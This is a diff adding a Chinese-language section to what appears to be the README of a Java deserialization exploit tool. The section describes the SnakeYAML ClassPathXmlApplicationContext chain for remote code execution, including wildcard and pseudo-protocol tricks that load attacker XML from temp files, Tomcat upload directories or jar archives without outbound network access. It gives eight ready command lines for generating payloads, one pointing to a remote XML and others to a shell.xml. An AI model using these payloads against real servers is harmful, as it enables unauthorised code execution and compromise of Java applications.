@@ -1371,6 +1371,40 @@ java.util.zip.InflaterOutputStream(OutputStream out, Inflater infl, int bufLen)
 -m SnakeYamlAttack -g MarshalOutputStream -a "C:\Users\butler\Desktop\Memshell\EncryptionUtil.class|D:\\04Testing\\Memshell\\EncryptionUtil.class"
 ```
 
+###  ClassPathXmlApplicationContext 利用链
+
+描述：SnakeYAML能调用构造函数，正好能触发 org.springframework.context.support.FileSystemXmlApplicationContext或org.springframework.context.support.ClassPathXmlApplicationContext 的构造方法来造成代码执行
+
+- ClassPathXmlApplicationContext 支持Java中的伪协议：http，file，netdoc，jar...
+- ClassPathXmlApplicationContext 支持通配符+伪协议Trick：
+  - 原理：能将构造方法url参数中的通配符(`*`和`?`)指定的文件整理成Resource，然后通过Spring的UrlResource#getInputStream来调用URL#openConnection进行挨个加载。
+  - 通配符：这里指的是文件路径中的通配符，`*`：匹配任意数量的任意字符(包括0个字符)，`**` 表示任意层级的目录(包括0层)，`?`：匹配任意单个字符。
+  - 环境变量：在构造方法中会调用PropertyPlaceholderHelper#parseStringValue(底层是System#getProperty)解析url参数中`${}`的环境变量，使用replace方法替换到url中，比如`${catalina.home}`
+  - 伪协议+通配符使用方式：在`*`和`?`的前面有`*/`和`:`才可以使用通配符Trick。`file:///tmp/*.xml`，`file:///D://tmp//??.?l`，`file:///{tmp}//??.?l`
+
+
+学习参考：[ClassPathXmlApplicationContext的不出网利用](https://mp.weixin.qq.com/s/GS86e2azoF5AdvGYQPk-7g)
+
+工具：使用这条链会生成 ClassPathXmlApplicationContext 和 FileSystemXmlApplicationContext 俩条Payload。
+
+```
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "http://127.0.0.1:2333/1x.ml"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "file:///tmp/*.xml"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "file:///D://tmp//??.?l"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "file:///tmp/tomcat.*/**/*.tmp"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "file:///C://Users/*/AppData/Local/Temp/tomcat*/**/*.tmp"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a "file:///${catalina.home}/**/*.tmp"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a “jar:file:///C://Users/*/ascii02.jar!/META-INF/resources/shell.xml"
+
+-m SnakeYamlAttack -g ClassPathXmlApplicationContext -a “jar:file:///tmp/ascii02.jar!/META-INF/resources/shell.xml"
+```
+
 ## 5.Shiro550反序列化(YsoAttack)
 
 ### 额外的参数
